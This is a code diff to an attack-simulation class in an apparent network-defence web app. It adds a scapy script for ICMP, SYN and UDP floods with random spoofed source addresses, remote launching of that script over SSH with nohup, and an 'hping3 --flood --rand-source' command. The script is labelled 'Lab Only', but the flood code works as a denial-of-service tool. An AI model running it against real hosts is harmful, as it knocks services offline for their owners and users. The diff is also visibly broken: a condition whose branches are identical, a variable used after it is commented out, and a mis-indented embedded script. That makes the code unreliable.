@@ -274,7 +274,7 @@ class AttackSimulator:
     # Trigger a DoS attack on the specified target IP
     def trigger_dos_attack(self, target_ip, attack_type, duration=30, speed=50, port=80):
         try:
-            if self.host != "localhost" and self.host != "127.0.0.1":
+            if self.host in ("localhost", "127.0.0.1"):
                 return self.trigger_remote_attack(target_ip, attack_type, duration, speed, port)
             else:
                 return self.trigger_remote_attack(target_ip, attack_type, duration, speed, port)
@@ -296,15 +296,20 @@ class AttackSimulator:
             with ssh.open_sftp() as sftp:
                 with sftp.file('/tmp/flood_attack.py', 'w') as f:
                     f.write(flood_script)
-            
-            # Execute attack
-            attack_command = self.build_attack_command(target_ip, attack_type, duration, speed, port, remote=True)
 
-            if attack_command:
-                stdin, stdout, stderr = ssh.exec_command(f'cd /tmp && timeout {duration + 5} {attack_command}')
-                logger.info(f"{attack_type} attack triggered on {target_ip} via SSH")
+            ssh.exec_command('chmod +x /tmp/flood_attack.py')
+            
+            # Build & run command
+            attack_command = self.build_attack_command(target_ip, attack_type, duration, speed, port, remote=True)
+            stdin, stdout, stderr = ssh.exec_command(f'cd /tmp && nohup {attack_command} > /tmp/attack.log 2>&1 &', timeout=5)
+            err = stderr.read().decode()
+            if err:
+                logger.error(f"Remote exec error: {err}")
                 ssh.close()
-                return True
+                return False
+            logger.info(f"{attack_type} attack triggered on {target_ip} via SSH")
+            ssh.close()
+            return True
             
         except Exception as e:
             logger.error(f"Remote attack execution error: {e}")
@@ -312,6 +317,9 @@ class AttackSimulator:
         
     def trigger_local_attack(self, target_ip, attack_type, duration, speed, port):
         try:
+            if os.geteuid() != 0:
+                logger.warning("Local injection usually requires root permissions.")
+
             # Build packet based on attack type
             pkt = self.build_packet(target_ip, attack_type, port)
             if not pkt:
@@ -387,10 +395,10 @@ class AttackSimulator:
         
     def build_attack_command(self, target_ip, attack_type, duration, speed, port, remote=False):
         if remote:
-            base_cmd = f"python3 flood_attack.py {target_ip}"
+            #base_cmd = f"python3 flood_attack.py {target_ip}"
             
             if attack_type == "ICMPFlood":
-                return f"{base_cmd} -1 -t {duration} -s {speed}"
+                return f"hping3 --flood --rand-source -1 -p {port} {target_ip}"
             elif attack_type == "SYNFlood":
                 return f"{base_cmd} -S -p {port} -t {duration} -s {speed}"
             elif attack_type == "UDPFlood":
@@ -403,7 +411,88 @@ class AttackSimulator:
 
     def _generate_flood_script(self):
         """Generate the flood script content for remote execution"""
-        return ''#!/usr/bin/env python3
+        return """
+        #!/usr/bin/env python3
+        from scapy.all import *
+        from colorama import Fore, init
+        import time, argparse, sys
+
+        # Initialize colorama
+        init(autoreset=True)
+
+        # Argument parser
+        parser = argparse.ArgumentParser(description="hping3-style Flood Script (Lab Only)")
+        parser.add_argument("target", help="Target IP address")
+
+        # Attack type (like hping3)
+        parser.add_argument("-1", dest="icmp", action="store_true",
+                            help="ICMP mode")
+        parser.add_argument("-S", dest="syn", action="store_true",
+                            help="SYN mode") 
+        parser.add_argument("--udp", dest="udp", action="store_true",
+                            help="UDP mode")
+
+        # Options
+        parser.add_argument("-p", "--port", type=int, default=80,
+                            help="Target port (for SYN/UDP, default: 80)")
+        parser.add_argument("-t", "--time", type=int, default=60,
+                            help="Attack duration in seconds (default: 60)")
+        parser.add_argument("-s", "--speed", type=int, default=50,
+                            help="Packets per second (default: 50)")
+        parser.add_argument("--flood", action="store_true",
+                            help="Enable max flood mode (ignore speed, send as fast as possible)")
+
+        args = parser.parse_args()
+
+        target_ip = args.target
+        target_port = args.port
+        duration = args.time
+        pps = args.speed
+
+        # Decide attack type
+        if args.icmp:
+            attack = "icmp"
+        elif args.syn:
+            flood_type = "syn"
+        elif args.udp:
+            flood_type = "udp"
+        else:
+            flood_type = "icmp"  # default = ICMP (like hping3 -1)
+
+        # If flood mode, no delay
+        if args.flood:
+            delay = 0
+        else:
+            delay = 1.0 / pps if pps > 0 else 0
+
+        # Build the packet
+        if flood_type == "icmp":
+            pkt = IP(dst=target_ip, src=RandIP())/ICMP()/("X"*600)
+        elif flood_type == "syn":
+            pkt = IP(dst=target_ip, src=RandIP())/TCP(sport=RandShort(), dport=target_port, flags="S")
+        elif flood_type == "udp":
+            pkt = IP(dst=target_ip, src=RandIP())/UDP(sport=RandShort(), dport=target_port)/Raw(load="X"*600)
+
+        # Print start message
+        if args.flood:
+            print(Fore.GREEN + f"[+] Starting MAX {flood_type.upper()} flood on {target_ip}:{target_port if flood_type!='icmp' else ''} for {duration} seconds...")
+        else:
+            print(Fore.GREEN + f"[+] Starting {flood_type.upper()} flood on {target_ip}:{target_port if flood_type!='icmp' else ''} for {duration} seconds...")
+            if flood_type != "icmp":
+                print(Fore.GREEN + f"[+] Port: {target_port}")
+            print(Fore.GREEN + f"[+] Speed: {pps} packets/sec")
+
+        start_time = time.time()
+
+        try:
+            while (time.time() - start_time) < duration:
+                send(pkt, verbose=0, inter=delay, count=1)
+        except KeyboardInterrupt:
+            print(Fore.RED + "\n[!] Attack stopped by user.")
+            sys.exit(0)
+
+        print(Fore.RED + f"\n[!] Attack finished after {duration} seconds.")
+        """
     
 
 # Analyze attack severity levels using network features and patterns
@@ -967,7 +1056,7 @@ def home(request):
 
                 else:  
                     attack_status = "Under Attack!"
-                    mitigation = AIMitigation(detection, analysis_report)
+                    #mitigation = AIMitigation(detection, analysis_report)
                 # Will implement mitigation strategies
 
             except json.JSONDecodeError as e:
